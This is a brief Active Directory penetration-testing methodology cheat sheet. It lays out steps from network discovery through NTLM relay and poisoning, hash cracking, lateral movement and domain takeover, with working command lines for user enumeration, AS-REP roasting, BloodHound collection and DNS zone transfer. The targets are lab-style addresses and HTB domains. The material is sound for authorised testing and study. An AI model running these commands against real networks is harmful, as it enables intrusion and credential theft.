# AD-pentest-methodology

Methodology to actually get somewhere during an engagement.

- Packet capture to understand better the network
- Host discovery  | arp, dns, llmnr, smb, ping sweeps, widening the attack surface
- Host enumeration | port scans, service identifaction
- Setting up ntlmrelayx.py, mitm6.py, responder and waiting for events
- If nothing useful comes back launch a vulnerabilty against the subnet
- If something comes back:
- Hash cracking using hashcat
- Inital access using psexec.py, smbexec.py, evil-winrm and the obtained hashes/passwords
- Get a stable shell, dump creds...etc
- Get sharphound, make it work and map out the network
- Attack highly priviliged targets and take over the network.

Tools to work from the outside (tunneling/proxychains):

Userenum:

- rpcclient -U "" -N -c enumdomusers %DC_IP%
- ldapsearch -x -b "dc=etc,dc=local" "*" -H ldap://10.10.122.13 | grep userPrincipalName
- kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users

Exploiting:

- GetNPUsers.py 'etc.loca/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.122.13
- impacket-GetNPUsers etc.local/ -usersfile user.txt -dc-ip 10.129.95.21
- bloodhound-python -c All -u username -p password -d etc.local -ns 10.10.122.13 --zip
- dig axfr @10.10.122.138 etc.local

Lateral movement:

- psexec.py
- wmiexec.py
- smbexec.py
- evil-winrm
- common services (SSH,RDP...etc)
